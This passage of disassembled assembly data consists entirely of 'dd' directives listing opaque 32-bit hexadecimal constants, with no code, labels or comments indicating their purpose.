		dd 91A961EBh, 0F9B0EE1Ah, 2358D525h, 2518CCB5h,	0CE7ADA99h
		dd 2917BD76h, 0C9B545B4h, 0B9D792F2h, 0FD77C230h, 60548D4Ch
		dd 5A9B67B9h, 0E330774Eh, 3156769Fh, 0C31159F7h, 0C7B989DBh
		dd 0CA38C847h, 1F898932h, 6D3486ABh, 186DF2A9h,	0B412E861h
		dd 0FF529Bh, 0FA71C63Dh, 0C5811D00h, 0D535D551h, 6D5ADBF4h
		dd 0B05B51DCh, 7C109351h, 3AB06DF9h, 77C03C2Bh,	9B6F7B6Ah
		dd 153EF578h, 30F538B0h, 7E674C4h, 0A8413C87h, 2BF66FE5h
		dd 11B974F7h, 17C1D27Eh, 0D90EBE10h, 60CEDE0Ah,	0B6BFC92Bh
		dd 0F19842EBh, 0CEE71D09h, 78C05FD9h, 0B2A4F0FFh, 0F4050153h
		dd 71355DB7h, 1BA0E2DEh, 0FBEB2376h, 53725808h,	8C91E117h
		dd 224F7ED7h, 9B74BE8Dh, 0CC48A9A3h, 0CF495A8Eh, 4E8D180Fh
		dd 31F8107Bh, 0EE990D87h, 82DAB388h, 89BE9499h,	0DB6CA10Ah
		dd 0FA0E5CBCh, 5AE0D64h, 0EA728883h, 52BEF35h, 0D3CA5F1Bh
		dd 7FA744C7h, 0FE58079Eh, 0B0A7745Bh, 7447CC83h, 92AD882Fh
		dd 0FEA96432h, 9BC01E2h, 3E57462h, 77CCC14Dh, 7E186824h
		dd 790F59CBh, 30B4FB68h, 816C2937h, 89560061h, 68091654h
		dd 0B9648C9Dh, 0B4D271DCh, 3082F9B2h, 53C664DAh, 0F502744Ch
		dd 9806E0B8h, 0A0A56842h, 3AC98B87h, 0F2F85402h, 0E1057ED7h
		dd 0CC4099C0h, 87F96EF7h, 2FDCDBFFh, 49DA1503h,	0C3718747h
		dd 0C8C150BDh, 0E2ECB5Dh, 0BB083FF7h, 0CED3D515h, 5B7AF962h
		dd 0AAAF5654h, 3E828A7Fh, 639B5B40h, 0CA7E4826h, 918E5046h
		dd 49ED5C82h, 67C6E207h, 0F4762A4Dh, 5FC84333h,	0B271AB6Ch
		dd 7C077F94h, 6A92C9BBh, 0C10AEA0Eh, 30EBBE64h,	4A3FEEBh
		dd 844FE027h, 0C7FAFB04h, 14EE43B9h, 0EEC2E0D0h, 4DDEC896h
		dd 0F8F13F0Dh, 0A2BE4861h, 5246D8F2h, 0CF65C801h, 0C5ED86BBh
		dd 2B038129h, 0C1E59ED3h, 0F07D7CBDh, 833BCA74h, 5B139BC4h
		dd 2AF5070Dh, 0F00B8724h, 8FC44989h, 0D22875C2h, 8F4CD56Eh
		dd 0AFC05C10h, 78D10E1Eh, 0D8F1134Ah, 26DAA573h, 0AD6C3586h
		dd 64307502h, 0B728585Bh, 3DD60AC9h, 7A845190h,	21F088AAh
		dd 3FEAFEDBh, 8642ECE9h, 0FB78C8C1h, 0AC94A806h, 0A8B0E2DFh
		dd 3BE5557Ch, 8900CDE7h, 43BB997Eh, 912B090Dh, 29D3A9D1h
		dd 307F6621h, 0E45A02FAh, 0DCDE46A4h, 42936F5h,	163AF640h
		dd 8487CDE1h, 0E8B68E25h, 0AC699026h, 5D9FF56Ah, 2A0C4CA4h
		dd 584FB64Bh, 0DDD203D4h, 8943CE79h, 71B47ADCh,	0D6732588h
		dd 37F81047h, 7A328DB3h, 0EBC11A76h, 0FFA9622Ch, 0B0E4EE88h
		dd 58825DC0h, 29EA22A0h, 88E7413Ah, 4C117149h, 3F42A67Dh
		dd 0D2463F57h, 0E8DB710Bh, 56CD265Bh, 78FF5740h, 22826FEh
		dd 7A8E4B12h, 0B4124601h, 6A84529Dh, 7840964h, 0DDF7C835h
		dd 5422BE77h, 0BDE7251h, 0AF601A08h, 0FC802E62h, 0A9871BF0h
		dd 0DF34AA30h, 86CF8411h, 2E4E0261h, 28D07E45h,	0C85C6390h
		dd 3491B96Fh, 0AB180626h, 8C76C34Eh, 62804BCFh,	7F8E0B0Bh
		dd 105275C5h, 0D65EA66Eh, 0AACCB60Fh, 2F2313D0h, 88207E85h
		dd 7AEC59C3h, 5F5C75A7h, 0A8E2C2CBh, 0E27AED46h, 0DB4495Dh
		dd 8176B6E4h, 6102C0A7h, 0C7830669h, 0DFA28328h, 0BC44E847h
		dd 850BFD96h, 0F195D3Ah, 0A1F843B8h, 9FF97982h,	53F3CBFh
		dd 36A46CB2h, 5B45A835h, 37C1E093h, 0A0650130h,	77908756h
		dd 0AF41D0DAh, 0B6D28EDEh, 3C6D48C5h, 3ABE2271h, 6FCBBEE7h
		dd 0FC77DB05h, 0B543BAD4h, 92198277h, 8BB7E32h,	6938A62h
		dd 6E0D4CD8h, 0A567BB5Eh, 0E04110F8h, 8A1ADC6Dh, 0A65AB351h
		dd 38B654C7h, 4F80D247h, 8F6FFC5Dh, 389DD052h, 0E0B9294Eh
		dd 0C2093E1Bh, 37FA725Fh, 57820807h, 53BEC67Eh,	0C9D9620Fh
		dd 7B5ECD4Dh, 0F0FE9D2Fh, 0B8CC13E3h, 9EEA6794h, 0CBB09BAFh
		dd 0DCC8610Bh, 303EB383h, 76D4B14Dh, 0E912975Eh, 1CF93363h
		dd 815B153Bh, 0FC9AA9EEh, 0A619C5AEh, 426C29FBh, 854D70Ch
		dd 0F0355FADh, 0F8B82CA3h, 0CE084CDEh, 62BD4F9Ch, 0A17EEBADh
		dd 7718B506h, 0E6C88673h, 67CB989Ah, 111FB6C4h,	9CFF0AC3h
		dd 0E1CC720Dh, 0B0E2230Fh, 3B87E013h, 7E0A9740h, 0E7BC1FEh
		dd 6D1738CFh, 0D8FFB45Eh, 9AE817FEh, 9A61CB3h, 0E37DDA94h
		dd 1A506Fh, 76425705h, 43C56470h, 4DA0D500h, 35AD77ACh
		dd 68D2AB44h, 7CB46383h, 0FF3D82BFh, 0D35FE15Bh, 2190CA4Dh
		dd 0F5FD4955h, 877ADDB9h, 73F857Ah, 0B584E5BDh,	0F619AD19h
		dd 3AF54493h, 141134Bh,	3EA1D7D3h, 37C87F3Eh, 94313CF8h
		dd 0D11FA0E5h, 0F2A4BC5Ch, 0A6930459h, 404EA163h, 9A3F1FEDh
		dd 0BD5CE06Bh, 0BD2CCDA1h, 0F40D4F6Bh, 73ADBB7Fh, 0F45DC59Bh
		dd 11F54538h, 77559F6Ah, 52597972h, 0E600A25Ah,	0F2819833h
		dd 8BC17D5Ch, 0C223BDFAh, 0F71A6F04h, 51CA20A3h, 19DE7FCCh
		dd 6DB91E70h, 7A2225CAh, 986D651Dh, 0FC3F4944h,	894563A0h
		dd 0E88DFAC0h, 175CE260h, 7C2423F9h, 2BDACF52h,	332CA663h
		dd 62F571E8h, 3CAEA0AAh, 696FACEDh, 3C052F08h, 9478D360h
		dd 0E9D36DA9h, 0BDAD1F03h, 0CF189C50h, 8CE76BCCh, 6C2359F2h
		dd 0DB088167h, 721C0F2h, 9B518225h, 7D2013AAh, 0B7E641DDh
		dd 0FC07E916h, 0FE17D54Eh, 0A81F2277h, 0DFD22E83h, 3D8429EFh
		dd 4EDC59F4h, 0D92411A7h, 0C7E56821h, 0EA58ED07h, 6438A538h
		dd 35DFF21Fh, 719EEC43h, 9C47E2FBh, 44B8F09Bh, 3B3B820h
		dd 0B988B07Bh, 25AD82B7h, 0EE9E9A09h, 5F5B7A0Eh, 23058E1Ah
		dd 66D6FC69h, 2374DAEEh
		dd 643F24CEh, 13B0E3ADh, 7A1DC1C8h, 2872F89Dh, 0A9E96B2Ch
		dd 0B0659421h, 2A2A002Bh, 0C48B262Bh, 5083D2B7h, 0E12E5E57h
		dd 8BC0383Bh, 12B17129h, 0BB26E8D8h, 6307FE33h,	95DAC349h
		dd 48CF94B9h, 0C853D683h, 4F30C2FBh, 1058DFCh, 0F4C26BA9h
		dd 0CDE5B318h, 0DC9438BAh, 0D409AAEBh, 9418155Dh, 0E84248F0h
		dd 17640BEDh, 185D2DBBh, 2FB95663h, 0FF312C5Ah,	0E15CE190h
		dd 0E5BBA4E6h, 0D7FC38F7h, 3DB143B5h, 0C3F883D5h, 0D6E2550Bh
		dd 95009DF5h, 0E3C19B4Dh, 267A0DBAh, 5101BE79h,	0B3306004h
		dd 0FE20CDF7h, 98D77705h, 69BE97FEh, 0C907B4D1h, 790AEFBAh
		dd 292EAD81h, 0E3AF5AE6h, 22B42A4Ah, 72527951h,	9007F5DFh
		dd 0D83CDE77h, 83F72892h, 0E952644Fh, 3C1C5A00h, 0DBDF0C2Dh
		dd 4C1B680Ah, 5B7CCA1Bh, 5C4D8398h, 65719467h, 0F1D04033h
		dd 0EA38F1E5h, 3C521E74h, 2467AAADh, 4B9E20B1h,	0B66A851Ch
		dd 3788A998h, 7396E7E2h, 0B19502E2h, 0EA181767h, 0C09F1081h
		dd 0FE7AC90Ch, 67F8AB2Eh, 9F62EAA7h, 0DE5339FEh, 937FD864h
		dd 0C8676E6Fh, 1B05C6B7h, 5AD7FBBDh, 0A8408FFCh, 0DFA540Eh
		dd 0CDFC8D51h, 6051623Fh, 0E6139E2Ah, 1C52B28Ch, 0D85CC8A2h
		dd 0FBA82576h, 7EED8EB6h, 0FBDB513Dh, 42599DFCh, 6AB79E4Dh
		dd 616CFC8Ah, 4A531E94h, 33FC9F49h, 31202697h, 3631B2EAh
		dd 1B8A993Ah, 7E3169E9h, 768927ABh, 0B4CEC4F2h,	87383CDDh
		dd 0A4FE17B2h, 693D87B8h, 3BD902A7h, 21573055h,	0FE152300h
		dd 0DDC4A33Eh, 89FE02CFh, 4496E9DDh, 951A9E37h,	0A43238A2h
		dd 0BE70BEC0h, 0D923AA7h, 7303A877h, 4E9484EEh,	0F57CD0E0h
		dd 29E705DCh, 0F579F873h, 1DD1A6C6h, 0E7D4AE2Dh, 8F97B199h
		dd 0CBCCFADBh, 0CE1D9AB1h, 8792A98Bh, 8EFFE2CDh, 0C7A9BA1Bh
		dd 8DEC954Dh, 8C752624h, 0A3205EA8h, 0E872217Fh, 0A0B253A7h
		dd 8C8471F6h, 1AAC4495h, 8F3B5F60h, 0B0B5069Ah,	409087B8h
		dd 3B4FF406h, 0A13D54A4h, 0BE3647EAh, 743E56BDh, 372FD338h
		dd 96B819DBh, 29787BD7h, 0F1B98B23h, 8F1FF581h,	4BA4B485h
		dd 33608C6Dh, 0C94F9463h, 54D5E4ACh, 1CD6F53Fh,	0E864FE86h
		dd 45A22B9Fh, 9B31594Ah, 0C8DA4064h, 0DC93BE4Fh, 77C305AFh
		dd 0B2AB9A8Fh, 0EE3A0176h, 98FCA086h, 2AD04607h, 6B5B0CF3h
		dd 0D86C885h, 82DFD60h,	20A18D33h, 0EDA91414h, 0EF82E1DBh
		dd 0AD8B68C9h, 0B93B2671h, 0F5B2CACAh, 0F83E473Dh, 0BBD5895Eh
		dd 0DF36EE4Ch, 9A2ACE88h, 0E709C0C3h, 517E3521h, 9ABDB079h
		dd 39001BACh, 0B9DABBB1h, 0CB6B3949h, 4B444F07h, 0FC9AA363h
		dd 28B4B3FFh, 0FE700FC4h, 9B5AF616h, 7AEEA624h,	5B6F9DF5h
		dd 4136D0FAh, 9BF7E3B4h, 0D65CA6FDh, 82768517h,	20F1B0ACh
		dd 35A8C72h, 85CB1586h,	0C151F67Ah, 0AAA9481h, 4DF493C5h
		dd 63199A4Ah, 0C9A54EFAh, 0AD537FD6h, 0ABB4027Dh, 0BFEB9028h
		dd 0B045BBCAh, 0C41ADFC4h, 376F79F2h, 685C3854h, 41B9DA77h
		dd 93C29438h, 71244752h, 816B74D4h, 98744064h, 0BD047DACh
		dd 7BF47305h, 8006B7D8h, 93F84D51h, 0BFF71D95h,	88A5E80Dh
		dd 99C7370Ch, 1AD6CF10h, 55B49A4Eh, 0BB899CF5h,	53321699h
		dd 1E546C6Fh, 3C106FCAh, 96FF5FA4h, 0F196B52Dh,	0B6BFE5A4h
		dd 4DE187AFh, 0A97CDD06h, 7FD2926h, 0C81E7CF7h,	0C074D050h
		dd 0AA7EE3F6h, 259B4CA5h, 220B245Ah, 66E831Fh, 8414F275h
		dd 55441A93h, 0B15DD990h, 0A942A067h, 34D9156Eh, 721AA683h
		dd 0B093BF75h, 0D8C8A160h, 0E4631304h, 0C91E2AF1h, 0BAB45E33h
		dd 15702D9Ch, 54C4FA4Eh, 473B2C03h, 9A03346Ah, 374F526h
		dd 0E5A2D073h, 76567AD7h, 75D61E0h, 41D0FB62h, 0B0466D33h
		dd 7ACA857Dh, 2F010C46h, 0A9A63B7Ch, 631EBE78h,	0E617D73Ah
		dd 6EAC074Ch, 8CE6965Ah, 8F6584CBh, 18ECACC3h, 8E98F8A1h
		dd 0F5DE3A56h, 0DCE5C6E7h, 27F2C8D0h, 0DF213434h, 43FC6BEEh
		dd 5EC05F7Ch, 92989234h, 22DF139Ah, 30080667h, 0A15FBEFh
		dd 0FCBE9355h, 8FF7155Dh, 0D3AFF55Bh, 0ABEA019Bh, 0E1654525h
		dd 3670055Fh, 55EB7C49h, 0AC3884C6h, 0F536B405h, 0D6B82F00h
		dd 0DC321748h, 84232AD9h, 0EAB2FD68h, 577A8F1Fh, 681A481Ch
		dd 0D9468EFDh, 0F8B9DE03h, 76EE5D6Eh, 47DE9543h, 26B589Ch
		dd 270D14FCh, 0ACCFD2C1h, 253734E8h, 22E55B3Ah,	0B99194BCh
		dd 17B0DD53h, 4C57ABDEh, 5D79619Ch, 5EDCB07h, 0C41182C7h
		dd 6579ABA8h, 76804AF6h, 34D3B8A9h, 8A614410h, 29CA46C4h
		dd 9B52AFA6h, 598C066h,	0C53BB8F7h, 656A7D48h, 8417B353h
		dd 738CE8E8h, 175EFC84h, 4FF6653Bh, 0C67F978h, 6C149C8Dh
		dd 7AC87980h, 45059142h, 3A316CDCh, 5674C100h, 0D0E3529Ah
		dd 0B45182Eh, 2B34FC10h, 0AAC72773h, 6DC87CC0h,	30762D51h
		dd 0BD45D5F0h, 0A735E2A0h, 6C18FFEDh, 3C75FDBh,	19692E4Bh
		dd 4CA5FAE0h, 607EB6C6h, 4596B739h, 0A2C365A8h,	72D53D62h
		dd 30DB31ECh, 4F6B716Dh, 0BC9E813Eh, 64197D95h,	7CA6675Fh
		dd 1EC243FCh, 2755EB56h, 29A71779h, 54A22CCAh, 20A5AC34h
		dd 1EB22B41h, 0CBB3B5DEh, 0C5AF379Dh, 2536DB1Ch, 0DD9C4667h
		dd 9D8C43BAh, 0DB1BC663h, 0AD5C4E01h, 4FF6BA15h, 0C16E74BFh
		dd 27D6CC1Bh, 0CD7B817Ch, 9B61CEAFh, 3E5CF6B3h,	95DB1D3Dh
		dd 0B2778B77h, 0E975A61Dh, 0E04487F3h, 1764F094h, 953D6A02h
		dd 0A0F78384h, 5F8BEBC2h, 0A5AB8246h, 18E19B7Bh, 0FEDF9B6Ch
		dd 21591DE9h, 78B6FABAh, 0AB77CDBDh, 306CB6EFh,	0B5AD215Ch
		dd 83072159h, 0F7143FB3h, 95E63AE7h, 75EA0C11h,	31762846h
		dd 99753AD9h, 0ABE48BB0h, 0B36EF9BFh, 7C31A67Eh, 15AFD811h
		dd 2A94918Bh, 5958757Bh, 4ECE1144h, 0B2C5B89Bh,	69191C69h
		dd 3BDBEFA3h, 0D523FF9Ah, 622BC263h, 0F748FC71h, 668C8BEAh
		dd 92AB8FCEh, 0C5A63709h, 0F215AE8Dh, 2988D38Bh, 0B1394D3Bh
		dd 88B98E05h, 0B2EE7550h, 1D01FCABh, 23A71FB8h,	8F33D9ABh
		dd 0DF87E99Fh, 703D852Ch, 3915E604h, 696DE69Ah,	0D8461495h
		dd 6D6CF9B5h, 9866FE52h, 0FF656DDBh, 0AD9F009Fh, 0FF71B1DAh
		dd 0BC6C68F4h, 66964908h, 9FD77004h, 6DD0C5CFh,	5660E3A9h
		dd 78DF256Ah, 0CFD26D5Ah, 3540AA93h, 0A9EA2C46h, 0F7BBC769h
		dd 0AD6AB07h, 0A8195D84h, 8876F112h, 0AD90BAAEh, 707A461Fh
		dd 0BC317E22h, 0D9FD5789h, 44C537F9h, 9C6C0C0Ch, 0E5AAEDB1h
		dd 0E05B9E3Ah, 0A130A8E7h, 57EC785h, 2001E6C0h,	4B9E3138h
		dd 1493C35Eh, 0AE9F3707h, 30E703EBh, 0E207E83Bh, 0EBCFA782h
		dd 0CD473BE5h, 5B969969h, 8AF67661h, 0BA4DA32Fh, 8E807A03h
		dd 0CF8AFFDEh, 0FABC0720h, 0CF2ECDC5h, 0CBEF4904h, 46A69223h
		dd 0C91EE226h, 84EAFFC3h, 9AE9F0CBh, 1AA66F13h,	0DF8086CDh
		dd 0B504B53Eh, 7973A526h, 72197903h, 0B5BB3FE6h, 991D8493h
		dd 0A6E60121h, 0C28D963Ah, 0FF9681FDh, 0D28D763h, 0B0592910h
		dd 56A464B9h, 0C1B169DEh, 9750A93Eh, 0B0711E02h, 30143568h
		dd 102B248Ah, 0E91EF16Dh, 6E4E85CBh, 0BB904F26h, 9CCCB18Eh
		dd 0F1CDEE96h, 0A97FA558h, 8C16BAEEh, 0A9D06EEAh, 1EC22A7Eh
		dd 37F877AAh, 0B3F2DDC3h, 5423833Ah, 1E41F1A8h,	0B577C31Fh
		dd 0FDA7962Ch, 8749DFD0h, 0D956C6Ch, 4557355Fh,	5379E7D4h
		dd 684A0C7Bh, 0F2075A3h, 4A54DA84h, 4C06C5BBh, 658863D3h
		dd 9A7B4A10h, 0CB915337h, 83564448h, 0D6C97705h, 621EEC4Dh
		dd 0B8334A56h, 8C52C4B6h
		dd 60612385h, 24075BE6h, 30B7C0A0h, 23DD3885h, 0DEBEFF34h
		dd 7A110AC7h, 0A1BBCD0Fh, 18D37C22h, 44A34DAAh,	5A164522h
		dd 0E9918384h, 5307DDA3h, 0EF4E647Eh, 177B3C87h, 42E39A42h
		dd 0D13917DBh, 0A2B62228h, 2A1B7FCEh, 0EC1CFDFh, 74107B3Bh
		dd 0FC1340F9h, 9AE75E44h, 0B696DF4Dh, 0ED6EC651h, 8F9CF200h
		dd 0CF342940h, 271604BDh, 0F73A66CBh, 387747B3h, 96BF7836h
		dd 941100D8h, 0F051BE9Eh, 37B34088h, 0AA41FD44h, 777D15D1h
		dd 1EEC44B8h, 5B6C90C5h, 2CB2DA71h, 0D92D3B6h, 951B38DAh
		dd 0C26E18D5h, 0B6B31AEh, 721C6E61h, 5A388EC2h,	3E2E9A78h
		dd 79C89584h, 0BA0F4651h, 0AA1B6640h, 758378C7h, 57F41257h
		dd 0BC3A0803h, 25FDF3EBh, 88B483BBh, 3963B204h,	9A35469Eh
		dd 502A7225h, 6532866Bh, 0A135F624h, 0D5C090C7h, 3251275Fh
		dd 3A48A2FAh, 0C9534E19h, 0D8DE9149h, 432355C4h, 809EDA99h
		dd 1E3A0C56h, 0E567D3F2h, 0E9DC4D5Fh, 9E43103Fh, 8F477031h
		dd 844EA0BDh, 30A51A99h, 7BCC8E5Fh, 1D709671h, 78CA8444h
		dd 0F42602EFh, 0F1A11B54h, 6BEA6479h, 86AD938Ah, 7A89B83Bh
		dd 0E1862008h, 0B9DD7DBEh, 0D81611Dh, 0D236DB27h, 114773B2h
		dd 0B5CBACF4h, 9564DACCh, 0F9AAD59h, 69B1E705h,	85CF3BEh
		dd 377AC9F6h, 0EF80F92Eh, 0CF7388E3h, 0A3434481h, 943ECD6Ch
		dd 0B8D01030h, 0B7BB98A3h, 0F1D763DDh, 0FCF6EF53h, 0FE219ED3h
		dd 20E24434h, 8F6E033Ah, 0F448395h, 0CA2F4717h,	3B8AC8D9h
		dd 0A6B751DCh, 47AF6BEh, 0ACA127C7h, 51EF4081h,	0A3EF29FEh
		dd 0C4ECF005h, 28CCE6A7h, 24697E7Dh, 0D254380Ch, 0E0AA5AEEh
		dd 0FBFDA22Dh, 26D5C09Eh, 99CCB447h, 2BA2338Bh,	33959A9Ah
		dd 4248EF58h, 5EF56C36h, 0B3F89C7Dh, 0FDDCFEBh,	695D6927h
		dd 0D0BB0A83h, 0B9708B9Bh, 8E9B665Bh, 80FEB65Dh, 85EA99DEh
		dd 0BE18BFB2h, 6E64642Bh, 65620CA6h, 357012B6h,	0FC593D27h
		dd 0A9DA641Eh, 0CCC121DAh, 4928584h, 1750EB2Dh,	65D2DB77h
		dd 958DB37Fh, 0F25912EEh, 3C120D10h, 2A265E53h,	34379C61h
		dd 93B8D975h, 4E8CBF23h, 5BD77965h, 7FE470EDh, 0CC5A91C4h
		dd 14E5271Eh, 5EC882EAh, 8D26060h, 56944B26h, 46A39142h
		dd 3BAD2C09h, 206B21A1h, 54A585B2h, 8E943CE9h, 5A0425EFh
		dd 0F15EC497h, 1DE24730h, 8A13B726h, 7AE74D17h,	0A1E8C05h
		dd 0CB30441Dh, 80FF2C2Fh, 0BE62DC6Fh, 564D303Ch, 0EA70DAEh
		dd 0A95C7F7Bh, 0FA33EFF2h, 8EF4C0C7h, 10EE6D3h,	156706CBh
		dd 2D709AFh, 61194993h,	0FAA53001h, 0E0280117h,	0E2EF3339h
		dd 9FDF418Fh, 0CE39FB80h, 79CDE81Ch, 0E0D3784Ch, 76388820h
		dd 0A4C7AD38h, 0F7E4CF74h, 9F8B98E6h, 45FDEDD2h, 1E5A8784h
		dd 5028h, 0FACEE3Bh, 7E29639Fh,	0DA3A7DD3h, 385B9160h
		dd 0B864BD2Ah, 6EDC63Ah, 9470A3DCh, 8BAA88A4h, 0C01521BEh
		dd 0AFB90A16h, 57A6E54Ah, 0D7DDFEB6h, 0B1ECADD4h, 0F6D06F62h
		dd 0CD62A8D7h, 223BB01h, 4DEEC7DAh, 0D41925A0h,	0CA093F3Ch
		dd 0AD4C9871h, 8D5F6F29h, 0FD052C95h, 6FFB828Dh, 9C9CACA2h
		dd 8D0A874Fh, 32CBB4BAh, 5B6D00FFh, 0B102B3C9h,	0E9A0C188h
		dd 9A20F371h, 0A48D8E9Ah, 4DCFC500h, 5094730Ah,	1E7ED720h
		dd 0E795288Fh, 0F8D89E4Eh, 0A06D8729h, 0A5168863h, 0E0D58319h
		dd 1E9B62A5h, 883A9F2Ah, 89840520h, 412B71F7h, 0E93E75F0h
		dd 0A780F307h, 0D416EAD9h, 0B0D26463h, 0D2E74995h, 9DD11D03h
		dd 8BDFB3E2h, 0A24C1971h, 93C6B263h, 1C2BE874h,	1C7C1996h
		dd 80B9A094h, 7D0998D2h, 18D121F3h, 3CF6D8BBh, 1E66F68Bh
		dd 0CE74D85Fh, 9BA84D7Ah, 0E0467685h, 0BC6C0D7Dh, 510A5AF4h
		dd 0C26DB09Eh, 452BA79h, 0EAFD4A97h, 42A2BA51h,	0F7708F22h
		dd 0BE26E295h, 0E79E2C2Fh, 0B6DE891Ch, 0FBC6F4BAh, 83431448h
		dd 6E8EB6h, 0A71DD4D0h,	9C24F3B9h, 1410790Bh, 16F9B8C9h
		dd 4775A9CAh, 70693711h, 1DCF73E6h, 0BD6DB3h, 0E929A26Ch
		dd 0D1FDD61Fh, 8D3FCA51h, 27F7F647h, 5F1B7D6h, 0C1361D10h
		dd 850D5005h, 0BB5B3377h, 6C92D055h, 30E38DF3h,	0E33B8C7Fh
		dd 65AA6A78h, 85321DD2h, 2F769D0h, 5672EB14h, 0ED1B3CDFh
		dd 5366126Bh, 7E08EA7Dh, 207B61E6h, 0D57E627Ah,	0B51DC967h
		dd 0F8B0C9Fh, 7546A652h, 4A97D6BFh, 0B2E4CBEAh,	5C60944Eh
		dd 0C0E8F852h, 28DC113Ch, 0D61B703Ah, 77F139BAh, 30B533C9h
		dd 0B71F8256h, 0F49499C6h, 0EAA96448h, 0B8C35241h, 0CCFE4903h
		dd 0C99E4671h, 6161D001h, 0A90159C5h, 0C63FF1AEh, 64186C74h
		dd 0A433267Ah, 37A84140h, 8A64299Ch, 1113C83Dh,	0D3B1608Ah
		dd 0AA1CB776h, 0CC2AF6C7h, 0F08A461Dh, 84CCBFC7h, 0BB9C1A21h
		dd 0D73538F9h, 5FF776C3h, 33EE43FEh, 6FF1543Ah,	5064F7C3h
		dd 0C14A55F6h, 4F5F18C4h, 48D35442h, 8291D05Bh,	9AA83141h
		dd 3AF9170Fh, 702C7461h, 43C4E7C3h, 3F650E9Fh, 3D5F7861h
		dd 0DA229A65h, 0C4FABF68h, 1482CA1Ch, 0AD52CF97h, 67F014CDh
		dd 157A0968h, 273D5872h, 0D2892E52h, 0E00CF0DCh, 830CF6EBh
		dd 6732DC91h, 933B49B6h, 0E57998FFh, 7D125DF8h,	0B3EF2765h
		dd 82FE3935h, 2AB0A4F0h, 7EF39663h, 397B7B00h, 402D79EBh
		dd 9881F56Dh, 9E3DE0A4h, 0ABD531BBh, 0F731460Fh, 319B1179h
		dd 0FCFF1B4Fh, 227F6E86h, 0B071D10Bh, 0B377510Fh, 94CB6F28h
		dd 0FC1DF684h, 0FAE5CE81h, 0C81A71CBh, 596FA1C2h, 2E74445Eh
		dd 0FB0F55EFh, 0C48F9CD3h, 0A7D483AAh, 0A5A82138h, 0F6C475Eh
		dd 951CF5C9h, 0F270A7E6h, 0F22C0E23h, 0A07FC1F6h, 0E6F7004Eh
		dd 0EDFD7181h, 791391FEh, 0DFF58395h, 5C0D0D49h, 0EC49616h
		dd 0D75EF128h, 20399166h, 60FBE7C7h, 0D28E6D33h, 82066A8Dh
		dd 2F571D86h, 6DF49102h, 0BCF8A3A6h, 0BC889DAAh, 601B87FAh
		dd 0BEF8D746h, 143465B6h, 4C7DA169h, 760EB8FDh,	87F23822h
		dd 0ACE95ADAh, 0F09EDF50h, 3FC6404Dh, 7EF0BB2Ch, 0FCB2B10Fh
		dd 0FAF3BABAh, 6D3EE08Ah, 3C5CB0DEh, 4EFAAF12h,	9CE65319h
		dd 0AA8F5E8Fh, 0E7A68D70h, 15E8EFBAh, 67C7C719h, 0CECA0DFFh
		dd 0CE276870h, 8E6BC4D1h, 0EC198900h, 35E9BEF0h, 6B8106C1h
		dd 50826193h, 0FD8EAD4Ah, 0B1DE1636h, 2D79A621h, 3377A7F9h
		dd 0B212587Fh, 0E3FE1564h, 4BB8D88Dh, 0C84DCCBBh, 0FBB0356Ah
		dd 0FC4B88ECh, 4FAED6CCh, 0F027A465h, 56718FF9h, 0C3E8D1CEh
		dd 452C7C3Fh, 1EDEEE14h, 0DC2B9E55h, 975B5DD1h,	17A31CC1h
		dd 0ACE5104Ch, 4BA7D742h, 6F237ED3h, 720553E0h,	0B4DC14B1h
		dd 42B80587h, 0E697A79Eh, 41B1AAAAh, 0A063D372h, 0A77F7BBAh
		dd 5D539576h, 1E359CB4h, 0D221A435h, 8D679366h,	532C260Bh
		dd 0B4A68AD1h, 6C6CC8F8h, 7BCACADBh, 2B0C6D3Ah,	0E1251085h
		dd 0BBDA4686h, 2F28179Eh, 0F97F4A2Dh, 427B8BF4h, 57AF2248h
		dd 60C9F035h, 0C0931269h, 9E0399AEh, 11462DF8h,	2BDD803Eh
		dd 2213773Eh, 10A702CEh, 0FE860285h, 9ABC224Bh,	0ADF45416h
		dd 334F3E41h, 0B53FA3C3h, 0A46F7576h, 0F624A472h, 0C6CF7742h
		dd 0DE2A3536h, 0FDA867CAh, 0B57EEF44h, 9550D6F2h, 6FCACEF2h
		dd 0A78ECCFBh, 0EC16AF82h, 0B7AB102Ch, 0CA8A30BBh, 0CEC2ABBDh
		dd 4A9BDF18h, 90C7D264h, 9F716945h, 0E48AF248h,	818966D4h
		dd 0C120DDDDh, 0A41EBBFCh, 58FC54E3h, 674880F6h, 0B26CEA7Bh
		dd 956BA7C4h, 0C036AFA2h, 98F8784Fh, 0A8E00ECh,	743453C2h
		dd 0A7E7842h, 0F10929D7h
		dd 0C6FA0F5Dh, 0E498CDF0h, 0B993CF42h, 3D3F0284h, 0CB70BCCDh
		dd 0FB4E42EDh, 0B307085Dh, 0C9CFD93Eh, 9FBB2E9Ch, 0C594CA89h
		dd 0EF843103h, 572CE419h, 6F9F97E0h, 0B9E3D401h, 62D501D6h
		dd 3D71555Ah, 0D6EB90BEh, 0F7219133h, 0F72B963Ah, 5E9A7E8Dh
		dd 2EBA8738h, 2871A5C1h, 90EE4CEAh, 6B46AB7Eh, 3B901BB0h
		dd 0EB8734h, 0B251C61Eh, 523EA392h, 0E6102926h,	4B075F76h
		dd 0F966CDFFh, 0C7C67D54h, 93267E26h, 86EFEAA1h, 380576C0h
		dd 0F9B1A3F1h, 238A8E88h, 0DE9FFA04h, 3E819645h, 872B8AE5h
		dd 32873757h, 0FEAB9D6Dh, 22D5D928h, 505B6942h,	0C72E6BD7h
		dd 1B88CDB5h, 280F5BCDh, 25EB606Ah, 0E92DBAAAh,	74F5F523h
		dd 16F2D780h, 0EB3A4254h, 3EAC48DBh, 3E1810E3h,	0BBAD87Eh
		dd 22934D82h, 0F5B1445Eh, 6AE717FBh, 0C91DD7C7h, 0B00D529Dh
		dd 20F6E28Ah, 1BBB0274h, 0AE2797EFh, 24921FB4h,	0FF364AB1h
		dd 2B39EBA1h, 9EEEA415h, 1CD1277Fh, 0F0D85C62h,	0E2984917h
		dd 0BFDD3B14h, 5E82523Fh, 25808655h, 0DA8810FCh, 5CBE5AB6h
		dd 0A3B1B5E3h, 0CD88A041h, 0D4CCC8B9h, 0C559E33Eh, 0D1211037h
		dd 0E4D8E6F3h, 0D5E40A04h, 8F90B2C8h, 26467243h, 3B6C273Bh
		dd 202422ABh, 6F2C3F58h, 0A4E50444h, 86074CB4h,	0E63B0010h
		dd 0EAF25275h, 8AA19AA4h, 9CE68CDEh, 0FF44B174h, 3B4CB4BBh
		dd 0F8A617E8h, 2C630E41h, 193926DFh, 476E0D29h,	235F12CFh
		dd 0ACC5B1FEh, 0C741C5A6h, 0B2C4E4B0h, 1EDCD635h, 9F8C5F24h
